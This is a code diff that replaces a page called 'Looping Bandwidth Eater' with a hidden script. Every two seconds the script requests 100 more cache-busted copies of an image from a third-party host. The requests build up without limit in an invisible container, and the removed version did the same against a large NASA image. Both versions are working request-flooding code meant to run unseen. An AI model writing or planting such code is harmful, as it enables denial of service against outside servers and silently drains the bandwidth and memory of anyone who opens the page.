@@ -1,47 +1,15 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Looping Bandwidth Eater</title>
-  <style>
-    .offscreen {
-      position: absolute;
-      left: -9999px;
-      top: -9999px;
-      width: 1px;
-      height: 1px;
+<script>
+  const baseUrl = 'https://one.one.one.one/media/card.png';
+  const container = document.createElement('div');
+  container.style.display = 'none'; // keeps it hidden but DOM persists
+  document.body.appendChild(container);
+
+  setInterval(() => {
+    for (let i = 0; i < 100; i++) {
+      const img = new Image();
+      const cacheBuster = `${Date.now()}-${Math.random().toString(36).slice(2)}`;
+      img.src = `${baseUrl}?cb=${cacheBuster}`;
+      container.appendChild(img);
     }
-  </style>
-</head>
-<body>
-  <h1>Looping image downloads...</h1>
-
-  <script>
-    const baseUrl = 'https://svs.gsfc.nasa.gov/vis/a030000/a030800/a030877/frames/5760x3240_16x9_01p/BlackMarble_2016_928m_canada_s_labeled.png';
-    const imagesPerBatch = 100;
-    const interval = 3000; // milliseconds between each cycle
-
-    let container = document.createElement('div');
-    document.body.appendChild(container);
-
-    function loadImages() {
-      // Clear previous batch
-      container.innerHTML = '';
-
-      for (let i = 0; i < imagesPerBatch; i++) {
-        const img = new Image();
-        const cb = `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
-        img.src = `${baseUrl}?cb=${cb}`;
-        img.className = 'offscreen';
-        container.appendChild(img);
-      }
-    }
-
-    // Initial load
-    loadImages();
-
-    // Loop
-    setInterval(loadImages, interval);
-  </script>
-</body>
-</html>
+  }, 2000); // every 2 seconds load 100 more images
+</script>
